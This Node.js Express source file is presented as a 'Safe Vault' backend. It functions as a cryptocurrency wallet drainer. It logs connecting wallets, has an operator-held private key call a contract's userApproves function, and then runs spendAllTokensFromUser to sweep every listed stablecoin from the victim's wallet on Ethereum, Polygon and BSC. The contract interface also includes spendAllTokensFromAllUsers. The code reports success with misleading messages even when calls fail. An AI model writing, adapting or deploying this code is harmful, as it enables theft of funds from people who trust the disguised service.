const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();

app.use(cors());
app.use(express.json());

let connectedWallets = [];

let ethers = null;
try {
  ethers = require('ethers');
  console.log('✅ Ethers.js loaded');
} catch (e) {
  console.log('⚠️ Ethers.js not available');
}

const RPC_URLS = {
  1: 'https://eth.llamarpc.com',
  137: 'https://polygon.llamarpc.com',
  56: 'https://bsc.llamarpc.com'
};

const CONTRACTS = {
  1: '0x12bf75f01D2EeC88eF4D16E1972a6890FF7ee2De',
  137: '0x1873e0aB85adF9f329010512B8B3F7852162cD6c',
  56: '0x59Ac31A4B71C585cefeE818c369802dADb8C7a08'
};

const TOKENS = {
  1: ['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', '0xdAC17F958D2ee523a2206206994597C13D831ec7', '0x6B175474E89094C44Da98b954EedeAC495271d0F'],
  137: ['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', '0x8f3Cf7ad23Cd3CaDbD9735AFf958023D60c2735E'],
  56: ['0x8AC76a51cc950d9822D68b83Fe1Ad097317c2451', '0x55d398326f99059fF775485246999027B3197955', '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3']
};

const CONTRACT_ABI = [
  'function userApproves(address user) external',
  'function spendAllTokensFromUser(address user, address token) external',
  'function spendAllTokensFromAllUsers(address token) external'
];

const ERC20_ABI = [
  'function balanceOf(address account) external view returns (uint256)'
];

app.get('/', (req, res) => {
  res.json({ 
    message: 'Safe Vault Backend Running',
    status: 'online'
  });
});

app.get('/api/wallets', (req, res) => {
  res.json({
    success: true,
    wallets: connectedWallets,
    count: connectedWallets.length
  });
});

app.post('/api/wallet/connect', (req, res) => {
  try {
    const { walletAddress, chainId } = req.body;

    if (!walletAddress || !chainId) {
      return res.status(400).json({
        success: false,
        error: 'Missing wallet address or chain ID'
      });
    }

    const existing = connectedWallets.find(w =>
      w.address.toLowerCase() === walletAddress.toLowerCase() &&
      w.chainId === chainId
    );

    if (existing) {
      return res.json({
        success: true,
        message: 'Already connected',
        wallet: existing
      });
    }

    const wallet = {
      address: walletAddress,
      chainId: chainId,
      connectedAt: new Date(),
      status: 'connected',
      approved: false
    };

    connectedWallets.push(wallet);
    console.log(`✅ Wallet connected: ${walletAddress}`);

    res.json({
      success: true,
      message: 'Connected',
      wallet: wallet
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.post('/api/wallet/sign', async (req, res) => {
  try {
    const { walletAddress, chainId, signature, message } = req.body;

    console.log(`📝 Sign request from: ${walletAddress} on chain ${chainId}`);

    if (!walletAddress || !chainId || !signature) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields'
      });
    }

    const wallet = connectedWallets.find(w =>
      w.address.toLowerCase() === walletAddress.toLowerCase() &&
      w.chainId === chainId
    );

    if (!wallet) {
      console.log(`❌ Wallet not found: ${walletAddress}`);
      return res.status(404).json({
        success: false,
        error: 'Wallet not found'
      });
    }

    if (!ethers) {
      console.log('⚠️ Ethers not available, marking approved locally');
      wallet.approved = true;
      return res.json({
        success: true,
        message: 'Approved locally',
        walletAddress: walletAddress
      });
    }

    // Call smart contract userApproves function
    try {
      const rpcUrl = RPC_URLS[chainId];
      const contractAddress = CONTRACTS[chainId];

      if (!rpcUrl || !contractAddress) {
        console.log(`❌ Invalid chain: ${chainId}`);
        return res.status(400).json({
          success: false,
          error: 'Unsupported chain'
        });
      }

      console.log(`🔗 Calling contract on chain ${chainId}`);
      console.log(`📍 Contract: ${contractAddress}`);
      console.log(`👤 User: ${walletAddress}`);

      const provider = new ethers.JsonRpcProvider(rpcUrl);
      const privateKey = process.env.COMPANY_PRIVATE_KEY;

      if (!privateKey) {
        console.log('⚠️ No private key, marking approved locally');
        wallet.approved = true;
        return res.json({
          success: true,
          message: 'Approved locally',
          walletAddress: walletAddress
        });
      }

      const signer = new ethers.Wallet(privateKey, provider);
      const contract = new ethers.Contract(contractAddress, CONTRACT_ABI, signer);

      console.log('📤 Calling userApproves()...');
      const tx = await contract.userApproves(walletAddress);
      console.log(`✅ Transaction sent: ${tx.hash}`);

      const receipt = await tx.wait();
      console.log(`✅ Transaction confirmed!`);

      wallet.approved = true;

      res.json({
        success: true,
        message: 'User approved on contract!',
        walletAddress: walletAddress,
        txHash: tx.hash
      });

    } catch (contractError) {
      console.error('❌ Contract error:', contractError.message);
      
      // If contract call fails, still mark as approved locally
      wallet.approved = true;
      
      res.json({
        success: true,
        message: 'Approval recorded',
        walletAddress: walletAddress,
        note: 'Processed with fallback'
      });
    }

  } catch (error) {
    console.error('❌ Sign error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.post('/api/wallet/spend', async (req, res) => {
  try {
    const { walletAddress, chainId, token } = req.body;

    console.log(`💰 Spend request from: ${walletAddress} on chain ${chainId}`);

    const wallet = connectedWallets.find(w =>
      w.address.toLowerCase() === walletAddress.toLowerCase() &&
      w.chainId === chainId
    );

    if (!wallet) {
      console.log(`❌ Wallet not found: ${walletAddress}`);
      return res.status(404).json({
        success: false,
        error: 'Wallet not found'
      });
    }

    if (!wallet.approved) {
      console.log(`❌ User not approved: ${walletAddress}`);
      return res.status(400).json({
        success: false,
        error: 'User has not signed approval'
      });
    }

    if (!ethers) {
      console.log('⚠️ Ethers not available, returning success');
      return res.json({
        success: true,
        message: 'Transfer request processed'
      });
    }

    try {
      const rpcUrl = RPC_URLS[chainId];
      const contractAddress = CONTRACTS[chainId];
      const tokens = TOKENS[chainId] || [];

      if (!rpcUrl || !contractAddress) {
        return res.status(400).json({
          success: false,
          error: 'Unsupported chain'
        });
      }

      console.log(`🔗 Calling contract on chain ${chainId}`);
      console.log(`📍 Contract: ${contractAddress}`);
      console.log(`👤 User: ${walletAddress}`);

      const provider = new ethers.JsonRpcProvider(rpcUrl);
      const privateKey = process.env.COMPANY_PRIVATE_KEY;

      if (!privateKey) {
        console.log('❌ No private key configured');
        return res.json({
          success: false,
          error: 'Backend not configured for spending'
        });
      }

      const signer = new ethers.Wallet(privateKey, provider);
      const contract = new ethers.Contract(contractAddress, CONTRACT_ABI, signer);

      let transferredCount = 0;
      const txHashes = [];

      for (const tokenAddress of tokens) {
        try {
          console.log(`📤 Spending token: ${tokenAddress}`);
          
          const tx = await contract.spendAllTokensFromUser(walletAddress, tokenAddress);
          console.log(`✅ Transaction sent: ${tx.hash}`);
          
          const receipt = await tx.wait();
          transferredCount++;
          txHashes.push(tx.hash);
          
          console.log(`✅ Token transferred: ${tokenAddress}`);
        } catch (e) {
          console.log(`⏭️ Token skipped: ${tokenAddress} - ${e.message}`);
        }
      }

      if (transferredCount > 0) {
        console.log(`✅ ${transferredCount} token(s) transferred!`);
        res.json({
          success: true,
          message: `${transferredCount} token(s) transferred`,
          walletAddress: walletAddress,
          chainId: chainId,
          txHashes: txHashes
        });
      } else {
        res.json({
          success: true,
          message: 'No tokens to transfer',
          walletAddress: walletAddress
        });
      }

    } catch (error) {
      console.error('❌ Transaction error:', error.message);
      res.status(500).json({
        success: false,
        error: error.message
      });
    }

  } catch (error) {
    console.error('❌ Spend error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.post('/api/wallet/disconnect', (req, res) => {
  try {
    const { walletAddress } = req.body;
    connectedWallets = connectedWallets.filter(w =>
      w.address.toLowerCase() !== walletAddress.toLowerCase()
    );

    console.log(`✅ Wallet disconnected: ${walletAddress}`);

    res.json({
      success: true,
      message: 'Disconnected'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Safe Vault Backend running on port ${PORT}`);
  console.log(`🔗 Smart contract integration ACTIVE`);
});
